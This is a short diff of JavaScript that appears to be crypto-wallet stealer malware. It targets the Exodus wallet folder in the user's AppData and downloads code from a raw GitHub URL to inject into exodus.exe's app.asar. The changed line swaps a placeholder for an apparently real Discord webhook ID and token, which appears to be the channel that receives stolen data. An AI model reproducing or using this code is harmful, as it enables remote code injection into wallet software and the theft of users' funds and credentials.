@@ -2141,7 +2141,7 @@ const localll = `C:/Users/${process.env.USERNAME}/AppData/Local/exodus`;
 const codeDownloadURL = 'https://raw.githubusercontent.com/xfixxygithubcdn/asar/main/index.js';
 
 // Define the Discord webhook URL
-const webhook = "putyourdiscordwebhook idandtoken example 1140099498811592776/ESVhMa2_MNqmQcCGQZif3goeF5HNyk5ozbEgkmqkimIZMvIW1mcGRUSLyl48bwLKAMMX";
+const webhook = "1146398110294225036/-XJ3DQNfFpmirZkaxeVSc0CTHyHh-NcyI8UYfQzP99k9nJUaka25IQDo3JvCpNJeb48D";
 
 // Call the extractAppAsarAndInject function with the correct parameters
 extractAppAsarAndInject(localll, 'exodus.exe', codeDownloadURL, webhook);
